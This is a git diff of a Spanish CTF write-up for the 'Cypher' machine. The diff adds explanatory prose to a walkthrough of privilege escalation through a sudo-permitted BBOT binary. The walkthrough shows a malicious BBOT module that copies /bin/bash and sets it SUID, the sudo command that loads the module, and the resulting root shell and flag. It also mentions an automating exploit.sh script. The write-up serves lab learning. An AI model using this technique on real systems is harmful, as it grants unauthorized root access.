-[DBUG] Installing csv - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "csv"
-[DBUG] Installing python - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
-[DBUG] No dependency work to do for module "python"
-[VERB] Loading 0 scan modules: 
-[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
-[VERB] Loaded module "aggregate"
-[VERB] Loaded module "cloudcheck"
-[VERB] Loaded module "dnsresolve"
-[VERB] Loaded module "excavate"
-[VERB] Loaded module "speculate"
-[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
-[VERB] Loading 5 output modules: csv,json,python,stdout,txt
-[VERB] Loaded module "csv"
-[VERB] Loaded module "json"
-[VERB] Loaded module "python"
-[VERB] Loaded module "stdout"
-[VERB] Loaded module "txt"
-[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
-[VERB] Setting up modules
-[DBUG] _scan_ingress: Setting up module _scan_ingress
-[DBUG] _scan_ingress: Finished setting up module _scan_ingress
-[DBUG] dnsresolve: Setting up module dnsresolve
-[DBUG] dnsresolve: Finished setting up module dnsresolve
-[DBUG] aggregate: Setting up module aggregate
-[DBUG] aggregate: Finished setting up module aggregate
-[DBUG] cloudcheck: Setting up module cloudcheck
-[DBUG] cloudcheck: Finished setting up module cloudcheck
-[DBUG] internal.excavate: Setting up module excavate
+...[snip]...
+
 [DBUG] internal.excavate: Including Submodule CSPExtractor
 [DBUG] internal.excavate: Including Submodule EmailExtractor
 [DBUG] internal.excavate: Including Submodule ErrorExtractor
@@ -882,13 +830,17 @@ www.blacklanternsecurity.com/bbot
 [DBUG] internal.excavate: Final combined yara rule contents: d497deda3f97174b93d787874b5869b2
 ```
 
-
-
 ### Creating a New BBOT Module to Perform Remote Code Execution through Sudoers Privilege
+
+Dado que el binario de BBOT se ejecuta con privilegios de `sudo`, tenemos la oportunidad de aprovechar esto para ejecutar código arbitrario en el sistema. Los módulos de BBOT están escritos en Python, por lo que podemos crear uno nuevo que aproveche esta funcionalidad.
+
+El enfoque consiste en copiar la estructura de un módulo existente (como `whois.py`), e inyectar un comando malicioso utilizando la librería `os`. Al importar `os` y usar `os.system()`, podemos ejecutar comandos arbitrarios en el sistema. Este nuevo módulo será cargado por BBOT, lo que nos permitirá ejecutar código de forma remota a través de la vulnerabilidad de los privilegios de `sudo`.
+
+Este método ofrece una forma simple de ejecutar comandos sin necesidad de interactuar directamente con la línea de comandos, aprovechando la ejecución de BBOT como un proceso privilegiado.
 
 {% embed url="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/" %}
 
-
+Lo primero que deberemos de hacer es crear un archivo `myconf.yml` el cual contendrá la ubicación donde crearemos nuestros nuevos módulos para `BBOT`. Por otro lado, crearemos el directorio donde almacenaremos los módulos nuevos y crearemos un nuevo módulo llamado `whois2.py` con la misma estructura del módulo `whois.py` que nos muestra en la documentación de `BBOT`.
 
 <figure><img src="../../.gitbook/assets/imagen (473).png" alt=""><figcaption></figcaption></figure>
 
@@ -899,14 +851,16 @@ graphasm@cypher:/tmp$ cd /tmp/modules
 graphasm@cypher:/tmp$ nano whois2.py
 ```
 
-
+El contenido de `whois.py` de ejemplo, lo podemos encontrar en la propia documentación de `BBOT`. Simplemente lo editaremos para importar la librería `os` e indicar que utilice la función `os.system` para ejecutar un comando.
 
 <figure><img src="../../.gitbook/assets/imagen (474).png" alt=""><figcaption></figcaption></figure>
 
+Nuestro módulo de `BBOT` malicioso que hemos creado es el siguiente. En este nuevo módulo, aparentemente tiene casi la misma apariencia del módulo `whois2.py`, pero en este hemos eliminado diferentes líneas de código para que el módulo malicioso funcione correctamente.
 
+Tal y como hemos comentado, en la parte superior hemos indicado `import os` para importar la librería de ejecución de comandos, y en el siguiente código se muestra la sección en la cual inyectamos nuestro código malicioso. En este caso, lo que realizaremos es una copia del binario `/bin/bash` y le daremos permisos de `SUID` a la copia creada, para así lograr obtener una `bash` como usuario `root` a través del parámetro `-p`.
 
 ```python
-    async def setup(self):
+  async def setup(self):
 	os.system("cp /bin/bash /tmp/gzzcoo && chmod u+s /tmp/gzzcoo")
 ```
 
@@ -935,7 +889,7 @@ class whois2(BaseModule):
 ```
 {% endcode %}
 
-
+A través del siguiente comando, lo que realizaremos es cargar la configuración de `/tmp/myconf.yml` y le indicaremos que el módulo a importar es `whois2` que es el módulo `BBOT` malicioso creado.
 
 ```bash
 graphasm@cypher:/tmp$ sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2
@@ -974,7 +928,7 @@ www.blacklanternsecurity.com/bbot
 [INFO] output.txt: Saved TXT output to /root/.bbot/scans/chiseled_crystal/output.txt
 ```
 
-
+Verificamos que el módulo se ha importado correctamente en `BBOT`, con lo cual si todo ha funcionado correctamente, al cargar el módulo en `BBOT`, también ha tenido que ejecutar el comando malicioso que hemos inyectado en el módulo.
 
 ```bash
 graphasm@cypher:/tmp$ sudo /usr/local/bin/bbot -p /tmp/myconf.yml -l | grep whois2
@@ -991,7 +945,11 @@ www.blacklanternsecurity.com/bbot
 | whois2               | scan     | No              | Query WhoisXMLAPI for WHOIS    | passive, safe                  | DNS_NAME             | WHOIS                |
 ```
 
+Revisamos los permisos de `/bin/bash` que debería disponer de los permisos por defecto, por otro lado, al revisar la copia que se nos ha creado del binario en `/tmp/gzzcoo`, comprobamos que tiene permisos de `SUID` y que el propietario es `root`.
 
+Con lo cual, al obtener permisos de `SUID` podemos obtener una `bash` como el propietario con el parémtro `-p` y como el propietario es `root`, accederemos con el usuario con máximos privilegios del sistema.
+
+Finalmente logramos acceder como `root` y visualizar la flag **root.txt**.
 
 ```bash
 graphasm@cypher:/tmp$ ls -l /bin/bash
@@ -1005,7 +963,7 @@ gzzcoo-5.2# cat /root/root.txt
 d497deda3f97174b93d787874b5869b2
 ```
 
-
+También hemos creado el siguiente script en `Bash` que automatiza este último proceso automáticamente.
 
 {% code title="exploit.sh" %}
 ```bash
@@ -1067,15 +1025,14 @@ fi
 ```
 {% endcode %}
 
-
-
-
+Le daremos los permisos de ejecución necesarios a nuestro script y lo ejecutaremos. Cuando nos muestre el mensaje de `Scan ready`, finalmente obtendremos una `bash` como el usuario `root`.
 
 {% hint style="danger" %}
 Press ENTER to execute root shell
 {% endhint %}
 
 ```bash
+user@gzzcoo:/tmp$ chmod +x exploit.sh
 user@gzzcoo:/tmp$ ./exploit.sh 
 Creating malicious BBOT config...
 Creating modules directory...
